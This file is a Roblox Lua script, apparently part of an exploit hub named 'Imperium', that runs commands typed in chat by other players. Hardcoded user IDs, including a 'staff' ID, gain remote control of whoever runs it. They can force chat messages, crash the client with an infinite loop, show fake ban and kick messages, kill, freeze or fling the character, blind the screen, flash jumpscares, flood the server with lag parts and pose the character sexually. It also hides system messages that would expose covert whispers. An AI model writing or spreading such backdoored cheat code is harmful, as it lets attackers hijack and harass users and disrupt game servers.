local players = game:GetService("Players")
local plr = players.LocalPlayer
local OnBenx = false
local prefix = "!"
local Flinging = false

local BrokenVip = {}
local BrokenPremium = {}
local BrokenStaff = {5127756688}

local milk = { 12480466786 }
local jumpscares = { 10755920324, 1119705746, 12213285275, 12293699441, 10727260846, 12342625873, 8804558033 }

local function GetRoot(player)
    return player.Character and player.Character:FindFirstChild("HumanoidRootPart")
end

local function GetLT(player)
    return player.Character and player.Character:FindFirstChild("LowerTorso")
end

local function GetHum(player)
    return player.Character and player.Character:FindFirstChild("Humanoid")
end

local function GetPing()
    return (game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()) / 1000
end

local function GetPlayer(UserDisplay)
    if UserDisplay ~= "" then
        for _, v in pairs(players:GetPlayers()) do
            if v.Name:lower():match(UserDisplay) or v.DisplayName:lower():match(UserDisplay) then
                return v
            end
        end
    end
    return nil
end

local function PredictionTP(player, method)
    local root = GetRoot(player)
    if root then
        local pos = root.Position
        local vel = root.Velocity
        GetRoot(plr).CFrame = CFrame.new(pos.X + vel.X * (GetPing() * 3.5), pos.Y + vel.Y * (GetPing() * 2), pos.Z + vel.Z * (GetPing() * 3.5))
        if method == "safe" then
            task.wait()
            GetRoot(plr).CFrame = CFrame.new(pos)
            task.wait()
            GetRoot(plr).CFrame = CFrame.new(pos.X + vel.X * (GetPing() * 3.5), pos.Y + vel.Y * (GetPing() * 2), pos.Z + vel.Z * (GetPing() * 3.5))
        end
    end
end

local function ToggleFling(bool)
    task.spawn(function()
        Flinging = bool
        while Flinging do
            local RVelocity = GetRoot(plr).Velocity
            GetRoot(plr).Velocity = Vector3.new(math.random(-150, 150), 9000, math.random(-150, 150))
            game.RunService.RenderStepped:wait()
            GetRoot(plr).Velocity = RVelocity
            game.RunService.Heartbeat:wait()
        end
    end)
end

local function Arg3(command)
    local x = ""
    for i = 3, #command do
        x = x .. " " .. command[i]
    end
    return x:sub(2)
end

local function CheckCMD(arg, command)
    return string.find(arg, prefix .. command) ~= nil
end

local function GenImage(list)
    task.spawn(function()
        local ScreenGui = Instance.new("ScreenGui")
        local Image = Instance.new("ImageLabel")
        ScreenGui.Name = "Temp"
        ScreenGui.IgnoreGuiInset = true
        ScreenGui.Parent = game.CoreGui
        Image.Name = "Image"
        Image.ImageTransparency = 0
        Image.BackgroundTransparency = 1
        Image.Position = UDim2.new(0, 0, 0, 0)
        Image.Size = UDim2.new(1, 0, 1, 0)
        Image.Image = "rbxassetid://" .. list[math.random(1, #list)]
        Image.Parent = ScreenGui
        task.wait(5)
        ScreenGui:Destroy()
    end)
end

local function BenxTP(player, offset)
    local lt = GetLT(player)
    if lt then
        GetRoot(plr).CFrame = lt.CFrame * CFrame.new(0, 0, offset) * CFrame.Angles(-1.5, 0, 0)
        task.wait()
        GetRoot(plr).Velocity = Vector3.new(0, 0, 0)
    end
end

local function ExecuteCommand(Pid, msg)
    local Speaker = players:GetPlayerByUserId(Pid)
    if not Speaker then return end
    local LowerCMD = msg:lower()
    local Split = string.split(LowerCMD, " ")
    local LowerName, LowerDisplay = string.lower(plr.Name), string.lower(plr.DisplayName)
    local ClientIsVip = table.find(BrokenVip, plr.UserId)
    local ClientIsPremium = table.find(BrokenPremium, plr.UserId)
    local SpeakerIsPremium = table.find(BrokenPremium, Speaker.UserId)
    local SpeakerIsOwner = table.find(BrokenStaff, Speaker.UserId)

    local function CanExecute()
        return (not ClientIsVip) or (SpeakerIsPremium and ((not ClientIsPremium) or SpeakerIsOwner))
    end

    pcall(function()
        local Allowed = string.find(LowerDisplay, Split[2]) or string.find(LowerName, Split[2])
        if Allowed then

            if CheckCMD(Split[1], "bring") and CanExecute() then
                if (not ClientIsPremium) or (SpeakerIsOwner) then
                GetRoot(plr).CFrame = GetRoot(Speaker).CFrame
                end
                
            elseif CheckCMD(Split[1], "c") and CanExecute() then
                if (not ClientIsPremium) or (SpeakerIsOwner) then
                local args = { [1] = ("/w " .. Speaker.Name .. " Hey, I'm using Imperium."), [2] = "All" }
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
                args = { [1] = ("/leave"), [2] = "To " .. Speaker.Name }
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
                task.wait(GetPing() + 0.1)
                for _, dm in pairs(plr.PlayerGui.Chat.Frame.ChatChannelParentFrame["Frame_MessageLogDisplay"].Scroller:GetChildren()) do
                    if dm:IsA("Frame") and dm:FindFirstChildOfClass("TextLabel") then
                        if string.find(dm:FindFirstChildOfClass("TextLabel").Text, "System") or string.find(dm:FindFirstChildOfClass("TextLabel").Text, "channel") then
                            dm.Visible = false
                        end
                    end
                end
                for _, bubble in pairs(game.CoreGui.BubbleChat:GetDescendants()) do
                    if bubble:IsA("TextLabel") and string.find(bubble.Text, "System") then
                        bubble.Parent.Parent.Visible = false
                    end
                end
            end

            elseif CheckCMD(Split[1], "fling") and CanExecute() then
                if (not ClientIsPremium) or (SpeakerIsOwner) then
                GetRoot(plr).CFrame = CFrame.new(9999999999, 9999999999, 9999999999)
                end

            elseif CheckCMD(Split[1], "freeze") and CanExecute() then
                if (not ClientIsPremium) or (SpeakerIsOwner) then
                for _, v in pairs(plr.Character:GetChildren()) do
                    if v:IsA("BasePart") then
                        v.Anchored = true
                    end
                end
            end

            elseif CheckCMD(Split[1], "jumpscare") and CanExecute() then
                if (not ClientIsPremium) or (SpeakerIsOwner) then
                GenImage(jumpscares)
                end

            elseif CheckCMD(Split[1], "milk") and CanExecute() then
                if (not ClientIsPremium) or (SpeakerIsOwner) then
                GenImage(milk)
                end

            elseif CheckCMD(Split[1], "say") and CanExecute() then
                if (not ClientIsPremium) or (SpeakerIsOwner) then
                local Message = Arg3(Split)
                local args = { [1] = Message, [2] = "All" }
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
                end

            elseif CheckCMD(Split[1], "slow") and CanExecute() then
                if (not ClientIsPremium) or (SpeakerIsOwner) then
                GetHum(plr).WalkSpeed = 5
                end

            elseif CheckCMD(Split[1], "unfreeze") and CanExecute() then
                if (not ClientIsPremium) or (SpeakerIsOwner) then
                for _, v in pairs(plr.Character:GetChildren()) do
                    if v:IsA("BasePart") then
                        v.Anchored = false
                    end
                end
            end

            elseif CheckCMD(Split[1], "unslow") and CanExecute() then
                if (not ClientIsPremium) or (SpeakerIsOwner) then
                GetHum(plr).WalkSpeed = 16
                end

            elseif CheckCMD(Split[1], "benx") then
                if (not ClientIsPremium) or (SpeakerIsOwner) then
                    OnBenx = true
                    repeat
                        task.wait()
                        pcall(function()
                            GetHum(plr).Sit = true
                            for offset = -1.2, -3, -0.2 do
                                BenxTP(Speaker, offset)
                            end
                        end)
                    until not OnBenx
                end

            elseif CheckCMD(Split[1], "unbenx") and (SpeakerIsOwner or OnBenx) then
                OnBenx = false

            elseif CheckCMD(Split[1], "unslow") and CanExecute() then
                if (not ClientIsPremium) or (SpeakerIsOwner) then
                GetHum(plr).WalkSpeed = 16
                end

            elseif CheckCMD(Split[1], "blind") and CanExecute() then
                if (not ClientIsPremium) or (SpeakerIsOwner) then
                    if game:GetService("Lighting"):FindFirstChild("Blur") then
                        game:GetService("Lighting"):FindFirstChild("Blur"):Destroy()
                    end
                    local Blur = Instance.new("BlurEffect")
                    Blur.Size = 30
                    Blur.Enabled = true
                    Blur.Parent = game:GetService("Lighting")
                end

            elseif CheckCMD(Split[1], "crash") and CanExecute() then
                if (not ClientIsPremium) or (SpeakerIsOwner) then
                    pcall(function()
                        while true do end
                    end)
                end

            elseif CheckCMD(Split[1], "fakeban") and CanExecute() then
                if (not ClientIsPremium) or (SpeakerIsOwner) then
                    pcall(function()
                        plr:Kick("You were permanently banned for using exploits.")
                    end)
                    task.wait(0.1)
                    while true do end
                end

            elseif CheckCMD(Split[1], "kick") and CanExecute() then
                if (not ClientIsPremium) or (SpeakerIsOwner) then
                    KickMessage = Arg3(Split)
                    plr:Kick("Kicked by " .. Speaker.Name .. ". Reason: " .. KickMessage)
                end

            elseif CheckCMD(Split[1], "kill") and CanExecute() then
                if (not ClientIsPremium) or (SpeakerIsOwner) then
                    GetHum(plr):ChangeState(15)
                end

            elseif CheckCMD(Split[1], "lag") and CanExecute() then
                if (not ClientIsPremium) or (SpeakerIsOwner) then
                    task.spawn(function()
                        local function SpawnBall()
                            local part = Instance.new("Part")
                            part.Shape = Enum.PartType.Ball
                            part.Name = "XD"
                            part.Size = Vector3.new(1, 1, 1)
                            part.Position = Vector3.new(-61, 300, -228)
                            part.Transparency = 0.5
                            part.CanCollide = true
                            part.Anchored = false
                            part.Parent = game.Workspace
                        end
                        while task.wait(0.15) do
                            for i = 1, 40 do
                                SpawnBall()
                            end
                        end
                    end)
                end

            end
        end
    end)
end

game.Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        ExecuteCommand(player.UserId, msg)
    end)
end)
